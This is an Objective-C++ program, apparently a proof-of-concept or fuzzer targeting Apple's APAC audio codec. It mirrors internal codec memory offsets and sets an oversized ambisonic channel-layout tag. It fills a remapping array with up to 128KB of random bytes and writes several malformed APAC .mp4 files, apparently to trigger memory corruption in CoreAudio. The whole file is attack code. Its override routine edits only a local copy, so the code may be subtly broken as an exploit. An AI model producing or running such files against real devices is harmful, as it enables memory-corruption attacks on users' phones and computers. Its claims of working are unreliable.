@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>

// Define kAudioFormatAPAC manually since it's not in the iPhoneOS 17.5 SDK
#define kAudioFormatAPAC 'apac' // FourCC code for 'apac'

// Utility function to calculate the size of an AudioChannelLayout
size_t AudioChannelLayoutSize(const AudioChannelLayout* layout) {
    return sizeof(AudioChannelLayout) + (layout->mNumberChannelDescriptions * sizeof(AudioChannelDescription));
}

// Utility function to copy an AudioChannelLayout
AudioChannelLayout* CopyAudioChannelLayout(const AudioChannelLayout* src) {
    size_t size = AudioChannelLayoutSize(src);
    AudioChannelLayout* dst = (AudioChannelLayout*)malloc(size);
    memcpy(dst, src, size);
    return dst;
}

struct CodecConfig {
    char padding0[0x78];
    AudioChannelLayout* remappingChannelLayout; // Non-const, will point to a mutable copy
    char padding1[0xe0 - 0x80];
    std::vector<char> mRemappingArray;

    // Constructor to initialize with a mutable copy
    CodecConfig(const AudioChannelLayout* layout) {
        remappingChannelLayout = CopyAudioChannelLayout(layout);
    }

    // Destructor to free the allocated memory
    ~CodecConfig() {
        free(remappingChannelLayout);
    }
};

void OverrideApac(CodecConfig* config, uint32_t channelTag, size_t arraySize) {
    config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | channelTag;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (size_t i = 0; i < arraySize; i++) {
        config->mRemappingArray.push_back(static_cast<char>(dis(gen)));
    }
}

int main() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> channelDist(1, 16); // Up to 16 channels
    std::uniform_int_distribution<> sizeDist(1024, 131072); // 1KB to 128KB
    std::vector<uint32_t> channelTags = {1, 2, 4, 8, 16};

    for (int i = 0; i < 5; i++) { // Run multiple tests
        uint32_t channelNum = channelDist(gen);
        uint32_t tag = channelTags[i % channelTags.size()];
        size_t arraySize = sizeDist(gen);

        AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                                channels:channelNum];
        AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                                     .mFormatID = kAudioFormatAPAC,
                                                     .mFormatFlags = 0,
                                                     .mBytesPerPacket = 0,
                                                     .mFramesPerPacket = 0,
                                                     .mBytesPerFrame = 0,
                                                     .mChannelsPerFrame = channelNum,
                                                     .mBitsPerChannel = 0,
                                                     .mReserved = 0};
        AVAudioChannelLayout* channelLayout =
            [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | tag];

        CodecConfig config(channelLayout.layout); // Create with mutable copy
        OverrideApac(&config, tag, arraySize);

        NSURL* outUrl = [NSURL fileURLWithPath:[NSString stringWithFormat:@"output_%d.mp4", i]];
        ExtAudioFileRef audioFile = nullptr;
        OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type,
                                                    &outputDescription, channelLayout.layout,
                                                    kAudioFileFlags_EraseFile, &audioFile);
        if (status) {
            fprintf(stderr, "Test %d: Error creating file: %x\n", i, status);
            continue;
        }

        status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                         sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
        if (status) {
            fprintf(stderr, "Test %d: Error setting format: %x\n", i, status);
            ExtAudioFileDispose(audioFile);
            continue;
        }

        status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                         sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
        if (status) {
            fprintf(stderr, "Test %d: Error setting layout: %x\n", i, status);
            ExtAudioFileDispose(audioFile);
            continue;
        }

        float audioBuffer[44100];
        for (int j = 0; j < 44100; ++j) {
            audioBuffer[j] = static_cast<float>(gen()) / static_cast<float>(gen.max());
        }
        AudioBufferList audioBufferList{
            .mNumberBuffers = 1,
            .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = sizeof(audioBuffer), .mData = audioBuffer}},
        };
        status = ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
        if (status) {
            fprintf(stderr, "Test %d: Error writing audio: %x\n", i, status);
        }

        status = ExtAudioFileDispose(audioFile);
        if (status) {
            fprintf(stderr, "Test %d: Error closing file: %x\n", i, status);
        }
    }
    return 0;
}
